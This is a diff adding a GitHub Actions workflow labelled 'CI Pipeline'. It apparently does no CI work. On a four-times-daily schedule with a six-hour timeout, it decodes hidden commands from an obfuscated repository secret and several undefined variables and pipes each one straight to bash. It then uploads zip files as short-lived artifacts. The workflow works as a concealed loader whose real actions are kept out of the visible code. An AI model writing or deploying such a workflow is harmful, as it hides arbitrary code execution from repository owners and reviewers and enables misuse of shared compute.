@@ -1,0 +1,31 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '10 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          qu39: ${{ secrets.qu39 }}
+        run: |
+          printf '%s' "$qu39" | jq -r .a87 | /bin/bash
+          echo $bnm67 | jq -r .u32080 | /bin/bash
+          echo $yoph588 | jq -r .aps7336 | /bin/bash
+          printf '%s' "$u76" | jq -r .lrx00 | /bin/bash
+          printf '%s' "$gty1" | jq -r .yujyi087 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: tfP1H5al
+          path: "*.zip"
+          retention-days: 1
